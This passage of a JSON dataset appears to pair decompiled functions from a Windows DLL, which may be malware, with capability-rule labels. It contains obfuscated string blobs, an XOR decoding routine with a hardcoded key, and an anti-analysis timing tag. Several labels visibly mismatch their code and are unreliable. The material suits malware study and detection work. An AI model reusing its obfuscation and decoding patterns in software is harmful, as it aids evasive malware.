iBMClMiz9TvzRKLLCaNbxNbbobanvYc6UW3huFv2LofvnXDhtztYq6Mi6aywTJE7hSHXfYYmUyHdUZEEdI9vUOH_yfdsKfZkhED9QHjFehXt3Mq6cVV5W9HJMRVOhXt3DhiDVV4pv_aBORVubq6vo_nP18k2v2MkRca8g9VXtxV2Zd8REAd8kgBdyXt3DsgWcW6icBNAo5hkc_hXGjW7xkKicBM4xKDxGvgXGgknvF1m83MkRXBgQj_SemVildBlNLZ0UQGpDzdTtQV2ZdchEAeLORVmyXt3fnKaFNdt83MkRf5uQj_SemViuyNlNPZsUQFaKXt3DnnbEXpV9VMkRTrfNhtjyIFBRtUhEAeJMRVuyXN3dspWcW2tdb5IcfYaZg6WUFS1BpBBPZgis7fNhtjYgmlqtUhEAeJMRVuCryXFoKemZIlZ3DmXHVBhsjdsqL3BpBFN9OpchCrRWscBSVZkhEA94JTFehXt3AhTQVV4tsfcP8JFeQjUemVq0XplNI9N5P7kw0t3BvfvsuykUBM4cLAqZgc1vLEOkhpBBNUwdTHfBhtjVLRSVY8JEAeBARVua6s3J4A2cW5vtUMkRbzRXqUemVmAa9lNLZMUQVqYJmhtQ12YamEH_3RnDKUL2n4jeTvFjseBM0zH_xmpLScmVmxrmd37Z0UQUjTcS4tQV2YdUhEAeLMRVmqj7wL4a3FuztDcAPbqV\n                            );\n    if (arg1 != ppiVar11) {\n        piVar6 = arg1[3];\n        if (0xf < piVar6) {\n            piVar10 = *arg1;\n            piVar9 = piVar10;\n            if (0xfff < piVar6 + 1U) {\n                piVar9 = piVar10[-1];\n                piVar10 = piVar10 - piVar9;\n                if (0x1f < piVar10 + -1) goto code_r0x0001800437e7;\n            }\n            fcn.18000253c(piVar9);\n        }\n        arg1[2] = NULL;\n        arg1[3] = 0xf;\n        *arg1 = 0;\n        uVar3 = *(ppiVar11 + 4);\n        uVar4 = *(ppiVar11 + 1);\n        uVar5 = *(ppiVar11 + 0xc);\n        *arg1 = *ppiVar11;\n        *(arg1 + 4) = uVar3;\n        *(arg1 + 1) = uVar4;\n        *(arg1 + 0xc) = uVar5;\n        uVar3 = *(ppiVar11 + 0x14);\n        uVar4 = *(ppiVar11 + 3);\n        uVar5 = *(ppiVar11 + 0x1c);\n        *(arg1 + 2) = *(ppiVar11 + 2);\n        *(arg1 + 0x14) = uVar3;\n        *(arg1 + 3) = uVar4;\n        *(arg1 + 0x1c) = uVar5;\n        ppiVar11[2] = NULL;\n        ppiVar11[3] = 0xf;\n        *ppiVar11 = 0;\n    }\n    if (0xf < var_38h) {\n        piVar10 = uStack88;\n        if ((0xfff < var_38h + 1U) && (piVar10 = uStack88[-1],  piVar6 = var_38h,  0x1f < uStack88 + (-8 - piVar10))) {\ncode_r0x0001800437e7:\n            fcn.18001484c(piVar10, piVar6 + 5);\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        fcn.18000253c(piVar10);\n    }\n    ppiVar11 = fcn.1800017b0(&uStack88, arg1, \n                             str.tHnXBhtftwV2QZkhEAfOnjFew3t3DkjaVV7kQBMw42MPDL4nGnH0lwYrv3MkRbgaZgUemUSpd1zJ_AEUfU2ZCOUemVqFMD4PBEUXmbKolQQV2ZY8GNDdrMRVuILYXGnHTGXpVbGfx0bAaZgB00FS1CpBBPyHhZXVBhtjtwV2ZdUpEALMRUecffrGwjAcR_sPPBEUQFgVj9TtQ12ZamEH_3RnDKUg9ZRtw12Zd8REAcDlDleyXt3DsgWcW7ueBNI_jV6cfcStwlWkhpBBNwSdTHfBhtjj_xSVd8REAd7RjleyXt3DsgWcW4tt_Motv2SjrYfGkkHHdWJfLTsBfYbqsr4PkGVELI2yzcAsnSuhoVTPoYXRUL3NDfBGCFYyXJDhgzDmuQpuXLYgtB1iIcuMoVhLdm_vbpc7gTUrQeLrazlLRjvWIQ9EROGSjIWsoXRdcg1PBFZWoLQj_Sc1EHKx3X9VIQc_A7UjfSS1EMnhctv3IQ_HSChXpDOO5SVd8QJINNCU6fJy9dvzRCGc1SwrxFZbgbmvgW7i3jVV6kUecJ9ESOQecxP4YXfRi6NDeBMBk44T9TvzR6xqeTjfBFVXjiQjSW2FC1BtFev7_irArYjm9ef2VEEbTYDcAHnRGJLYWJioXTWrscS4vlp27b4mJoEtgFiicSdXGzFew3JDIW8wrN8gJIfSis7fBy8jXb6t3hN1w9YrvC3QfWS10fbGE7kQSdOyH1dyXpDtwV2ZdUgHI4LdTFey3t3FsoXTRrueReLIOHXBhtz1h2qqqEtt_NwKPKSjnfQ0lmVEXpF6wQAdfYaZh894EFSGdWk9VskVT_fBhtzDb9SVd8pEBdhahYHw0t3Hi02eQfucBMg_HV6YvgXGnFq7Z8f8zMkcKNEG_gXGmnqKm2783MkTTXMyHmUemVy4_9lNLZMUREFh9LsVQV2dTfscBMg9EV6YrOdpvnZEXpFvXMkVboSZhfYemViZpbdDbYTTXDXSvgXGmFlHF5lv3skVca_afWC10KYlLdjvXskVbAqZh_6pUpS3hpBFL5EURHVDhtrtUV2ZpYkvX8EsnV6Yuf8PkHTGXpFSXurhbAqZh1SuGi3hpBFL5EUREWwftL_Y0a3AJBPGJWInnT7hsDxr6tHdJhD8AdXnV_dUPkFhlRbuxXJMRUCvhWPkGVEXo9UIcAdQKFf_hWPkFd0dJtNDc9LTdeQjDXwURSVWNxKzcAerWxSj9TAxkZVV5qsAEFdTFjqW1TPk7WJ1plNAqS8TFeTbuPUFSaNfVNDcP8XNfQj9u6K5SVVHgnD8AdfbbmjhTPq8RVV4puXMkBXnVjb7W5kZSVVTeNDeBOlZQj_7Yrs8lPO9MzcAcLDrmjhTPkjJL12isdcHdTF72z9Tv8SyUl5lA9b_irDrojhTPlZ9VV4hv7rgcjFeyaqLOUFSvVCRycjH8NlZQj8fAkFS7ZOpPuB8NlZQj987r6tGdMhEEfB0NlZQj9cv_S6Ul5lPuM4c_bbmjhTPssxVV7kue8HdTEiRXo3tcyKUl5lw9bBnzLX1dUPkHZ0IZiNDfBlTLXxdUPkHqSiw8Bba1rTZeQnDSFYTT4IZiNDfjqSzLhbqzOUFSM1tlNLaFlTZeQgiPkHZ2L5iNDf3lPC0RrbG3kZSVd_Q1DAAdaYPSj8XtcyyUl5lv6LYcjFeybK7OUFSvcVGyshm_Cnm0LtTPqgjq6Ga87LYcjFekIVTPvmbF0jXv7rYcjFetd7ruSBK05PMr6VrTZeQrTe5kZSVamEH_3RnDKUg9ZXt8yKUl5ltYLYcjFewKpXPobXtVllNO04dTHf999UPkHEbH2otYLgcjFeZJZ588rXtVllNLyFrTZeQtei87tkhpBZHEgdTEWyefr9wNE598hEGc8JDFew0t3bsWvU16icBNUAF9eQrQfGhWltObOnp2qtNtYy2t3asAmcQpWsjQAsrSRT9TBtJSVZ_I1DAAdT7fz99UPkFXVCkP9ZLgcjFeTbTe3kZSVamEjA6Olgmf\n                            );\n    if (arg1 != ppiVar11) {\n        piVar6 = arg1[3];\n        if (0xf < piVar6) {\n            piVar10 = *arg1;\n            piVar9 = piVar10;\n            if (0xfff < piVar6 + 1U) {\n                piVar9 = piVar10[-1];\n                piVar10 = piVar10 - piVar9;\n                if (0x1f < piVar10 + -1) goto code_r0x0001800437ed;\n            }\n            fcn.18000253c(piVar9);\n        }\n        arg1[2] = NULL;\n        arg1[3] = 0xf;\n        *arg1 = 0;\n        uVar3 = *(ppiVar11 + 4);\n        uVar4 = *(ppiVar11 + 1);\n        uVar5 = *(ppiVar11 + 0xc);\n        *arg1 = *ppiVar11;\n        *(arg1 + 4) = uVar3;\n        *(arg1 + 1) = uVar4;\n        *(arg1 + 0xc) = uVar5;\n        uVar3 = *(ppiVar11 + 0x14);\n        uVar4 = *(ppiVar11 + 3);\n        uVar5 = *(ppiVar11 + 0x1c);\n        *(arg1 + 2) = *(ppiVar11 + 2);\n        *(arg1 + 0x14) = uVar3;\n        *(arg1 + 3) = uVar4;\n        *(arg1 + 0x1c) = uVar5;\n        ppiVar11[2] = NULL;\n        ppiVar11[3] = 0xf;\n        *ppiVar11 = 0;\n    }\n    if (0xf < var_38h) {\n        piVar10 = uStack88;\n        if ((0xfff < var_38h + 1U) && (piVar10 = uStack88[-1],  piVar6 = var_38h,  0x1f < uStack88 + (-8 - piVar10))) {\ncode_r0x0001800437ed:\n            fcn.18001484c(piVar10, piVar6 + 5);\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        fcn.18000253c(piVar10);\n    }\n    ppiVar11 = fcn.1800017b0(&uStack88, arg1, \n                             str.dDFeCrTPGnlTVV7uiBMwdDFeCrTnGmlTVV4tv5skZTBeQnPYimVSVF5lfb5btbgiZk8atzLi3BpBVH6DFpFeybt3xkFSVRfsX69J9lLOQnLaTcnbEXpdv7MkhTFeQnpg98gWcW7usBPodTFece3aemV63tpB1DcAdQKXy3t3Hqnm26CaB_dI_LV6yj9TPgnZUB0lNDfH8RXeQj9TLNhSVZnhELMAdTF4Xj9TdsSSWtuqNDcAsrV6mj9TPrUNVV7ksBPYdTFeDsiswcDecYZlNDeGQWQTw4t35kFSVfXXZnrH8RWWQj9TVZ9SVd_hEP8AdTGQTD9Tv812nV5lNOv5XY7VzhubPkFS7f_FlJf3lPC0RIeIdSl93MpB_DcAdbDqZvdTPkE5_YFk87MktTFeQr7_PkHZ2XqlNDcAgtB1iO66PYvo57B4q_bpc7jSZv9TPkHT4XqlNDcALIFeQrTXGoFSVV7usBPIdTFeybt35kFSVecenFuZnRk1vMAbt0QHal5lfL50UXkSy0t3fgnRMXpdNHDERVuQnpg9wRhlRbu4XLvrgiZhfQWmVyVaG1fLbE5TFeQn4NYR8PDp2pHLsXnXGh_ablHbHVYwfLqozchvXfS0gFQVV6isVcBdTFF8j9TDZrqE95lNPCFETBeQoVyPkFvHyJlNDiE6DBeQgIVvkFSWtqGNDcASAaDQj9cu2JQVV6isW8BdTEb_j9Tv8QKVF5l4bX_irrTGj5TPvlN0LU0w9bBnzTX12dSPkGT8AZkNDcK9LQGQz9Td4xSVd_QbDYAdfJmRTUuxFTVV5WzjcAPbwKZg84uxFTVV56vbJQdDFew7oDP0FSICJlNFyFJTBeQlbauxFTVV7kgWcBdTFRcJtfcQyVF5lHyYAdbDbIj5TPoaqqqHkgVcBdTE8sjBTtcQyVF5lcLyNJTBeQnvYuxlTVV4tvzqFTTFey3t3Hqm6UV5ljTYAdTHbgocZQkFSWhu83TD_is6Zx29SPkE7m15ltbpQdDFewg0JLyrXBV9lNByJ8GFfQj_SixFTVV5JFHnqsrQGQz9TEflSVZ_IbDYAdTaf72dSPkFc1Os9NTcAiU5Dr7mZkBSVW6KU3vH8FFfQj8zbEFS7e2qFQKLFFfQjk32qYhLdm_vbpcLjTIj5TPgnfGXpVtYJgdDFeEftdPgXZ2D5kNDdE_rQGQz9TtdQCVF5l3Mh6is7mdeJTPqgKq6Ga87JgdDFeysFTPsDXNV9lNGJ8is7f919SPkEgx1xl87JQdDFeZgZTPsDXBV9lNDuGdTHfx29SPkHJ115ltbJQdDFeQJ9TPsDnBV9lNLXofTGZx2dSPkHqdl5l9ZpYdDFeRr7WZkBSVUoOy8iBGlfQj_uFhzL1Os9NTcAYZKvvXvYsxlTVV7uoWcBdTHVz19SPkG6GyWay48VGTFefyo_PkFd0OYy8iLtnnV3hs7PEFSHdhdDUAdWydjvOffhIa1rIlfLzanf_UvMAbtUQ9aV5l83MkTX6YQj8bu4Fd0PplNDfHMRVqsTVTPvmHFEOxv3skQca_nC_g95n4MN_3BnDfXDhtntQ12YamE9d0E_GV6dr4nGnWO0lNl83MkRQtPQjSWmViWN8hEAeMls6hKXt3DmzbEXpVjJyq35vfNhtjjC3NZkhEA__1DFeyXN3Braz7NnjYXTBnzfXFhtrhPO8SMHkQBM4B05XQrQXGnnZEXpVv3MkQdnbJcGsdshX72VlNHLvnndhn8Idr6ymZKpvWMkZbgSZjcGdsqHd2JVPBFbSdkQjUe1lTVV5ltXoYLFcsdr4mJkiLJK_ucS9MHS2y3qjQRKdYZlNPZlbTLfNyeQazJzPht9c75FbbArWgrbzPZEEbscd_HMClJFz9TvzRK7hpslxFbXPXByfYc1nqbN92DMDhXvuPqzyZ_6hU3BN9tXIYeyahvb4mJkv0SdvucSJMN2ZBxeJYUFS1CtNtEL_fFobah7ae2nTIHaXFrIX9ER2KWgyYIYXtefiNDeBONF3\n                            );\n    if (arg1 != ppiVar11) {\n        piVar6 = arg1[3];\n        if (0xf < piVar6) {\n            piVar10 = *arg1;\n            piVar9 = piVar10;\n            if (0xfff < piVar6 + 1U) {\n                piVar9 = piVar10[-1];\n                piVar10 = piVar10 - piVar9;\n                if (0x1f < piVar10 + -1) goto code_r0x0001800437f3;\n            }\n            fcn.18000253c(piVar9);\n        }\n        arg1[2] = NULL;\n        arg1[3] = 0xf;\n        *arg1 = 0;\n        uVar3 = *(ppiVar11 + 4);\n        uVar4 = *(ppiVar11 + 1);\n        uVar5 = *(ppiVar11 + 0xc);\n        *arg1 = *ppiVar11;\n        *(arg1 + 4) = uVar3;\n        *(arg1 + 1) = uVar4;\n        *(arg1 + 0xc) = uVar5;\n        uVar3 = *(ppiVar11 + 0x14);\n        uVar4 = *(ppiVar11 + 3);\n        uVar5 = *(ppiVar11 + 0x1c);\n        *(arg1 + 2) = *(ppiVar11 + 2);\n        *(arg1 + 0x14) = uVar3;\n        *(arg1 + 3) = uVar4;\n        *(arg1 + 0x1c) = uVar5;\n        ppiVar11[2] = NULL;\n        ppiVar11[3] = 0xf;\n        *ppiVar11 = 0;\n    }\n    if (0xf < var_38h) {\n        piVar10 = uStack88;\n        if ((0xfff < var_38h + 1U) && (piVar10 = uStack88[-1],  piVar6 = var_38h,  0x1f < uStack88 + (-8 - piVar10))) {\ncode_r0x0001800437f3:\n            fcn.18001484c(piVar10, piVar6 + 5);\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        fcn.18000253c(piVar10);\n    }\n    ppiVar11 = fcn.1800017b0(&uStack88, arg1, \n                             str._LV6wj5TPsDWcd5kNDf3RDFew4t3vkBSVcoOTeL8RXeQz9TtcV2DV9lNLyEUZFeQj7ewisqhbsMZUddTEay0N3dg3bOXolvVskTX3XJhtje3KbEdWmfLzXPLqQy0t3FgnRMXpFNMjQObzCZv9TPkEb3gVVfbxrTXjVMX8ataITCh87dWpBKW6dQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV5lNDcAdTFeQj9TPkFSVV9pNjcMpzQOQztSPkVwVV5kPTYAfBNeQj5DPEFCh1c1NTgGdT46Tz9cCk1SWsxuRDYbfTFFJipTJRVGVUVRJjcbhyUuQy9RPlHgXA5kMDYAcXNeQj5XP0FWN15lNTgGdT46ST9cCktSWixuRDYEdDFa4D9TP1ZaVUkRJzcXESBeVQtDPlaARQ5kKDwAaUVJQiM3KEFOAUtlKAMUdS1fUD9G3kFSVFdnND6ScAFfSDtTNHVeVVT3MkcBfDNeSw1RbkBKU159UD4AbQVWQicBKjFTSFllKTbedTTk9YXktiXA5lNDYRdjFP4DVjNxFSVV95PzccQRteXj5xPlGiW75p5D3AfUFZIjkDPkFTWVxlOIUFJTBNRz9A_E0iXj5vBD5QdTFfTDtTMHVeVVD3PkcBYjleVUtBPlY2RF5yACcAYuNOEj5ZOkFYYVRlPkUGBTBMQD9BTE9iVHxsNBV0LjF8JmVTHHUKVXxkYjcUJTFeQzVRPksgU25kLDQAbTDUQjYDPkFTRlllJ9UMhTuOSk9UXkdiUA5lNDYXfTFJJitTKRVBVUlRJjcXhyEuQyRaPlomf15UB4AbgV2QiRSGEFCBV5lNTMBdTW8Qj9SKklSQTp1NCNUejFKdjFTKvNCJV95PjccQSBeXk1GzlKyRI5q9DpweVFVEj5cOEFdYVJlO0UIBTYRG9SM0VSWGppNDqSc2FfRD1TONNQZV9wMjcVASJeVwtBPlSgXg5kOjUAe2NUcj5LPUFKVAZlPWcAdTBQQz9dvEFSVEhgNCEBOTFZMjljOxFSVV9pNTcMFzFeQyRbPlomRV5UDgAbgVQQiThKhFTSlVlK9MhdS4qYj9MWl5SSmp7NCgBaTFKEj9TP1BRVU9kLDcFJTFeQyBYPl42TF56YCAAagVIQiBSLEFKpUiFIEcAdTBFRD9IP9BSWS5uVD0wfGFfTT1TMbNXBV91NjcQBzgOQzVXPktmUl5vBjFwdCFcQi8BNxFTW1plOsUEBTJuQG9SLkNSRcxsZDYifDF8NthTHCW0VXxR0DcidNNeVm9TPkBeV15ppjJQdCVWQis3MEFGAVNlIAMMdSXMUk9SJUtSTjpzNCxUYDFFditTJbNGpUyFJEcBfTBeSp1TPkBUV15jZjUwdCJYQiw3LkFBYVFlJ4UPBTBJRj9ECktSQix1ZDYXcjFJdiVSKUBEVFYVM1cGJTFeQy5QPlBTQV5gZDcAdC5VQiAnHkFNMUFlKwMedS5fWD9HzlOyRQ5lNDYffjFBphxTITVwVUEBFTcfQRFeXT5NPlUCVV5kMjUAc0Nccj5FNkFEMU1lIgMSdSfsTd9eTk0CVEdvNC50ZjFH\n                            );\n    if (arg1 != ppiVar11) {\n        piVar6 = arg1[3];\n        if (0xf < piVar6) {\n            piVar10 = *arg1;\n            piVar9 = piVar10;\n            if (0xfff < piVar6 + 1U) {\n                piVar9 = piVar10[-1];\n                piVar10 = piVar10 - piVar9;\n                if (0x1f < piVar10 + -1) goto code_r0x0001800437f9;\n            }\n            fcn.18000253c(piVar9);\n        }\n        arg1[2] = NULL;\n        arg1[3] = 0xf;\n        *arg1 = 0;\n        uVar3 = *(ppiVar11 + 4);\n        uVar4 = *(ppiVar11 + 1);\n        uVar5 = *(ppiVar11 + 0xc);\n        *arg1 = *ppiVar11;\n        *(arg1 + 4) = uVar3;\n        *(arg1 + 1) = uVar4;\n        *(arg1 + 0xc) = uVar5;\n        uVar3 = *(ppiVar11 + 0x14);\n        uVar4 = *(ppiVar11 + 3);\n        uVar5 = *(ppiVar11 + 0x1c);\n        *(arg1 + 2) = *(ppiVar11 + 2);\n        *(arg1 + 0x14) = uVar3;\n        *(arg1 + 3) = uVar4;\n        *(arg1 + 0x1c) = uVar5;\n        ppiVar11[2] = NULL;\n        ppiVar11[3] = 0xf;\n        *ppiVar11 = 0;\n    }\n    if (0xf < var_38h) {\n        piVar10 = uStack88;\n        if ((0xfff < var_38h + 1U) && (piVar10 = uStack88[-1],  piVar6 = var_38h,  0x1f < uStack88 + (-8 - piVar10))) {\ncode_r0x0001800437f9:\n            fcn.18001484c(piVar10, piVar6 + 5);\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        fcn.18000253c(piVar10);\n    }\n    fcn.1800024e0(var_30h ^ auStack136);\n    return;\n}\n",
        "token_count": 42663
    },
    "180041e9": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nint64_t fcn.180041e90(ulong noname_0, ulong noname_1, int64_t arg3, ulong arg4)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int64_t iVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    \n    fcn.1800144a8(0x180056188);\n    fcn.1800144a8(L\"8192\");\n    fcn.1800144a8(L\"4096\");\n    iVar5 = (**0x180092a38)();\n    if ((iVar5 != 0) && (arg4 != 0)) {\n        iVar2 = (*0x180090a80 + 3) * *0x180090a7c;\n        iVar8 = ((*0x180090a80 + *0x180090a74) * *0x180090a74 * -2 + 2) * *0x180090a84;\n        iVar9 = (*0x180090a78 * *0x180090a84 * *0x180090a74 + 1) * *0x180090a74;\n        iVar3 = (*0x180090a84 + -3) * *0x180090a70;\n        iVar4 = (*0x180090a78 + 2) * *0x180090a80;\n        uVar6 = 0;\n        do {\n            iVar1 = iVar8 + uVar6;\n            uVar7 = uVar6 + 1;\n            *(iVar1 + iVar5) =\n                 \"u1^B?S>ARU^e47\"[uVar6 % 0xf] ^ *(((((iVar9 - iVar2) + iVar3 + iVar4) * 4 - iVar8) + iVar1) + arg3);\n            uVar6 = uVar7;\n        } while (uVar7 < arg4);\n    }\n    return iVar5;\n}\n",
        "token_count": 457
    },
    "18002ad8": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nuint64_t fcn.18002ad80(ulong arg1, ulong arg2, uint32_t *arg3, uint32_t *arg4)\n\n{\n    int64_t *piVar1;\n    ulong arg1_00;\n    int64_t iVar2;\n    uint8_t uVar3;\n    int32_t iVar4;\n    int64_t iVar5;\n    uint64_t uVar6;\n    uint64_t uVar7;\n    \n    uVar7 = arg1;\n    uVar6 = *0x180090000 ^ *(uVar7 * 8 + 0x180091c70);\n    uVar3 = *0x180090000 & 0x3f;\n    uVar6 = uVar6 >> uVar3 | uVar6 << 0x40 - uVar3;\n    if (uVar6 != 0xffffffffffffffff) {\n        if (uVar6 != 0) {\n            return uVar6;\n        }\n        if (arg3 != arg4) {\n            do {\n                uVar6 = *arg3;\n                iVar5 = *(uVar6 * 8 + 0x180091bd0);\n                if (iVar5 == 0) {\n                    arg1_00 = *(uVar6 * 8 + 0x180048e60);\n                    iVar5 = (*_sym.imp.KERNEL32.dll_LoadLibraryExW)(arg1_00, 0);\n                    if (iVar5 == 0) {\n                        iVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                        if (((iVar4 == 0x57) && (iVar4 = fcn.180023290(arg1_00, L\"api-ms-\", 7),  iVar4 != 0)) &&\n                           (iVar4 = fcn.180023290(arg1_00, L\"ext-ms-\", 7),  iVar4 != 0)) {\n                            iVar5 = (*_sym.imp.KERNEL32.dll_LoadLibraryExW)(arg1_00, 0, 0);\n                        }\n                        else {\n                            iVar5 = 0;\n                        }\n                    }\n                    if (iVar5 != 0) {\n                        piVar1 = uVar6 * 8 + 0x180091bd0;\n                        iVar2 = *piVar1;\n                        *piVar1 = iVar5;\n                        if (iVar2 != 0) {\n                            (*_sym.imp.KERNEL32.dll_FreeLibrary)(iVar5);\n                        }\n                        goto code_r0x00018002aeb2;\n                    }\n                    *(uVar6 * 8 + 0x180091bd0) = 0xffffffffffffffff;\n                }\n                else if (iVar5 != -1) {\ncode_r0x00018002aeb2:\n                    if (iVar5 != 0) goto code_r0x00018002aecd;\n                }\n                arg3 = arg3 + 1;\n            } while (arg3 != arg4);\n        }\n        iVar5 = 0;\ncode_r0x00018002aecd:\n        if ((iVar5 != 0) && (uVar6 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar5, arg2),  uVar6 != 0)) {\n            uVar3 = 0x40 - (*0x180090000 & 0x3f) & 0x3f;\n            *(uVar7 * 8 + 0x180091c70) = (uVar6 >> uVar3 | uVar6 << 0x40 - uVar3) ^ *0x180090000;\n            return uVar6;\n        }\n        uVar3 = 0x40 - (*0x180090000 & 0x3f) & 0x3f;\n        *(uVar7 * 8 + 0x180091c70) = (0xffffffffffffffffU >> uVar3 | -1 << 0x40 - uVar3) ^ *0x180090000;\n    }\n    return 0;\n}\n",
        "token_count": 863
    },
    "18002c55": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nuint64_t fcn.18002c550(ulong noname_0, uint32_t *arg2, ulong noname_2, uint32_t *arg4)\n\n{\n    uint8_t uVar1;\n    uint64_t uVar2;\n    \n    fcn.180026460(*arg2);\n    uVar1 = *0x180090000 & 0x3f;\n    uVar2 = *0x180090000 ^ *0x1800921a8;\n    fcn.1800264b4(*arg4);\n    return uVar2 >> uVar1 | uVar2 << 0x40 - uVar1;\n}\n",
        "token_count": 143
    },
    "180034ac": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nvoid fcn.180034acc(ulong arg1)\n\n{\n    // WARNING: Could not recover jumptable at 0x000180034aec. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(*((arg1 >> 6) * 8 + 0x180091d90) + (arg1 & 0x3f) * 0x48);\n    return;\n}\n",
        "token_count": 100
    },
    "180034bb": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nvoid fcn.180034bb4(ulong arg1)\n\n{\n    // WARNING: Could not recover jumptable at 0x000180034bd4. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(*((arg1 >> 6) * 8 + 0x180091d90) + (arg1 & 0x3f) * 0x48);\n    return;\n}\n",
        "token_count": 103
    },
    "18003c0b": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nint64_t fcn.18003c0b4(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    uint8_t *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int64_t iVar4;\n    uint *puVar5;\n    int64_t iStackX32;\n    \n    iVar4 = fcn.180034dd8(arg1 & 0xffffffff);\n    if (iVar4 == -1) {\n        puVar5 = fcn.180023574();\n        *puVar5 = 9;\n    }\n    else {\n        iVar2 = (*_sym.imp.KERNEL32.dll_SetFilePointerEx)(iVar4, arg2, &iStackX32, arg3);\n        if (iVar2 == 0) {\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            fcn.180023504(uVar3);\n        }\n        else if (iStackX32 != -1) {\n            puVar1 = *((arg1 >> 6) * 8 + 0x180091d90) + 0x38 + (arg1 & 0x3f) * 0x48;\n            *puVar1 = *puVar1 & 0xfd;\n            return iStackX32;\n        }\n    }\n    return -1;\n}\n",
        "token_count": 291
    },
    "18002d42": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18002d420(int64_t arg1)\n\n{\n    // WARNING: Could not recover jumptable at 0x00018002d424. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(arg1 + 0x30);\n    return;\n}\n",
        "token_count": 75
    },
    "18000136": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.180001360(int64_t *arg1)\n\n{\n    uint64_t uVar1;\n    int64_t iVar2;\n    code *pcVar3;\n    int64_t arg1_00;\n    \n    uVar1 = arg1[3];\n    if (0xf < uVar1) {\n        iVar2 = *arg1;\n        arg1_00 = iVar2;\n        if (0xfff < uVar1 + 1) {\n            arg1_00 = *(iVar2 + -8);\n            if (0x1f < (iVar2 - arg1_00) - 8U) {\n                fcn.18001484c(iVar2 - arg1_00, uVar1 + 0x28);\n                pcVar3 = swi(3);\n                (*pcVar3)();\n                return;\n            }\n        }\n        fcn.18000253c(arg1_00);\n    }\n    arg1[2] = 0;\n    arg1[3] = 0xf;\n    *arg1 = 0;\n    return;\n}\n",
        "token_count": 233
    },
    "18000250": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180002500(int64_t arg1)\n\n{\n    code *pcVar1;\n    int64_t iVar2;\n    int32_t iVar3;\n    \n    do {\n        iVar2 = fcn.180014920(arg1);\n        if (iVar2 != 0) {\n            return;\n        }\n        iVar3 = fcn.180014974(arg1);\n    } while (iVar3 != 0);\n    if (arg1 == -1) {\n        fcn.180001230();\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    fcn.1800023a8();\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 160
    },
    "18002637": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180026378(int64_t lpMem)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    \n    if ((lpMem != 0) && (iVar2 = (*_sym.imp.KERNEL32.dll_HeapFree)(*0x180091d88, 0, lpMem),  iVar2 == 0)) {\n        puVar1 = fcn.180023574();\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uVar4 = fcn.1800234bc(uVar3);\n        *puVar1 = uVar4;\n    }\n    return;\n}\n",
        "token_count": 151
    },
    "180002dd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
